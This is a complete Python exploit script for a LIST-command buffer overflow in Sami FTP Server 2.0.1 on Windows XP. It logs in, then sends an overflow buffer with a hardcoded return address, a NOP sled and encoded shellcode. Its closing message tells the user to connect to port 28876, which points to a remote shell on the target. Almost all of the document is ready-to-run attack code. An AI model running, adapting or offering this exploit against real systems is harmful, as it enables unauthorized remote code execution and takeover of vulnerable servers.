#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Exploit Title: Sami FTP LIST buffer overflow
# Date: 27 Feb 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.karjasoft.com/old.php
# Version: Sami FTP Server 2.0.1
# Tested on: Windows XP Pro SP1, English
#            Windows XP Pro SP2, English
#
# Description: 
# A buffer overflow is triggered when a long LIST command is sent to the 
# server and the user views the Log tab. 
#

from socket import *
import struct, sys

IP = sys.argv[1]

#valor do EIP - Valor do ESP = 20
nops = "\x90" * 40


#ShellCode
shell = ("\xb8\x72\xb2\x4f\x8d\xd9\xee\xd9\x74\x24\xf4\x5b\x29\xc9" +
"\xb1\x56\x31\x43\x13\x83\xeb\xfc\x03\x43\x7d\x50\xba\x71" +
"\x69\x1d\x45\x8a\x69\x7e\xcf\x6f\x58\xac\xab\xe4\xc8\x60" +
"\xbf\xa9\xe0\x0b\xed\x59\x73\x79\x3a\x6d\x34\x34\x1c\x40" +
"\xc5\xf8\xa0\x0e\x05\x9a\x5c\x4d\x59\x7c\x5c\x9e\xac\x7d" +
"\x99\xc3\x5e\x2f\x72\x8f\xcc\xc0\xf7\xcd\xcc\xe1\xd7\x59" +
"\x6c\x9a\x52\x9d\x18\x10\x5c\xce\xb0\x2f\x16\xf6\xbb\x68" +
"\x87\x07\x68\x6b\xfb\x4e\x05\x58\x8f\x50\xcf\x90\x70\x63" +
"\x2f\x7e\x4f\x4b\xa2\x7e\x97\x6c\x5c\xf5\xe3\x8e\xe1\x0e" +
"\x30\xec\x3d\x9a\xa5\x56\xb6\x3c\x0e\x66\x1b\xda\xc5\x64" +
"\xd0\xa8\x82\x68\xe7\x7d\xb9\x95\x6c\x80\x6e\x1c\x36\xa7" +
"\xaa\x44\xed\xc6\xeb\x20\x40\xf6\xec\x8d\x3d\x52\x66\x3f" +
"\x2a\xe4\x25\x28\x9f\xdb\xd5\xa8\xb7\x6c\xa5\x9a\x18\xc7" +
"\x21\x97\xd1\xc1\xb6\xd8\xc8\xb6\x29\x27\xf2\xc6\x60\xec" +
"\xa6\x96\x1a\xc5\xc6\x7c\xdb\xea\x13\xd2\x8b\x44\xcb\x93" +
"\x7b\x25\xbb\x7b\x96\xaa\xe4\x9c\x99\x60\x93\x9a\x57\x50" +
"\xf0\x4c\x9a\x66\xe7\xd0\x13\x80\x6d\xf9\x75\x1a\x19\x3b" +
"\xa2\x93\xbe\x44\x80\x8f\x17\xd3\x9c\xd9\xaf\xdc\x1c\xcc" +
"\x9c\x71\xb4\x87\x56\x9a\x01\xb9\x69\xb7\x21\xb0\x52\x50" +
"\xbb\xac\x11\xc0\xbc\xe4\xc1\x61\x2e\x63\x11\xef\x53\x3c" +
"\x46\xb8\xa2\x35\x02\x54\x9c\xef\x30\xa5\x78\xd7\xf0\x72" +
"\xb9\xd6\xf9\xf7\x85\xfc\xe9\xc1\x06\xb9\x5d\x9e\x50\x17" +
"\x0b\x58\x0b\xd9\xe5\x32\xe0\xb3\x61\xc2\xca\x03\xf7\xcb" +
"\x06\xf2\x17\x7d\xff\x43\x28\xb2\x97\x43\x51\xae\x07\xab" +
"\x88\x6a\x27\x4e\x18\x87\xc0\xd7\xc9\x2a\x8d\xe7\x24\x68" +
"\xa8\x6b\xcc\x11\x4f\x73\xa5\x14\x0b\x33\x56\x65\x04\xd6" +
"\x58\xda\x25\xf3")

buf =  "A" * 216 + "\x20\x10\x82\x7e" + nops + shell

#Conexção ao servidor de FTP
s = socket(AF_INET, SOCK_STREAM)
s.connect((IP,21))
print s.recv(1024)

s.send("USER test\r\n")
print s.recv(1024)

s.send("PASS test\r\n")
print s.recv(1024)

print "[+] sending payload of size", len(buf)
s.send("LIST " + buf + "\r\n")
print s.recv(1024)

s.close()
print "[+] sent. Connect to %s on port 28876" % (sys.argv[1],)
